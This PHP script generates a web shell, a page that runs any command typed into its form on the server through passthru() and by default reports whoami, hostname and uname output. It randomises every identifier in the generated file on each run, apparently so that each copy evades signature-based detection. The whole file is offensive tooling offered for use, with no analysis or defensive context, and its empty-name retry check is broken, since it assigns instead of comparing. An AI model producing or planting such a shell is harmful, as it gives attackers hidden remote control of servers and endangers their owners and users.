<?php


function make_random_name(){
	$name = rand() * rand();
	$name = hash("whirlpool", $name);
	$name = crypt($name);
	// shorten
	$name = preg_replace('~([\.\$/]|.{16}$)~', '', $name);
	// rm leading numbers
	$name = preg_replace('/^[0-9]+/', '', $name);
	// make sure the regex didn't leave us an empty string
	return ($name = NULL? make_random_name(): $name);
}

$functions = array(
	"eval_function" => make_random_name(),
	"eval_arg" => make_random_name(),
	"html_console_tag" => make_random_name(),
	"post_2233" => make_random_name(),
	"post_command" => make_random_name(),
	"script_name" => make_random_name(),
	"no_command" => '"whoami; hostname; uname -a"',
	"page_html" => make_random_name(),
	);
/*
for ($i=0; $i<=10; $i++){
	$functions[$i] = make_random_name();
}
*/
echo '
<?php

$'.$functions['page_html'].' = <<< EOF
<html>
	<head>
		<style>
			input{ background-color: rgb(255, 255, 255); width: 50%;}
			* { font-size: 12px; color: rgb(0, 0, 0); font-family: monospace !important;}
			body{ background-color: rgb(250, 250, 250);}
			'.$functions['html_console_tag'].'{ color: rgb(170, 170, 170);}
		</style>
	</head>
	<body>
		<form action="'.$functions['script_name'].'" id="form" method="POST">
			<span>$ </span>
			<input type="text" name="'.$functions['post_2233'].'" autocomplete="off" autofocus>
			<span> 2&gt;&amp;1 </span>
			<button type="submit">$$$</button>
		</form>
	<code>
<pre>
EOF;

function '.$functions['eval_function'].'($'.$functions['eval_arg'].'){
	echo "<'.$functions['html_console_tag'].'>$ ".$'.$functions['eval_arg'].'."</'.$functions['html_console_tag'].'><br>";
	echo passthru($'.$functions['eval_arg'].'." 2>&1");
}
$'.$functions['post_command'].'=$_POST["'.$functions['post_2233'].'"];
echo preg_replace('."'/".$functions['script_name']."/'".', '."basename(\$_SERVER[\"SCRIPT_NAME\"]), $".$functions['page_html'].');

isset($'.$functions['post_command'].')? '.$functions['eval_function'].'($'.$functions['post_command'].') : '.$functions['eval_function'].'('.$functions['no_command'].')
;?>';

?>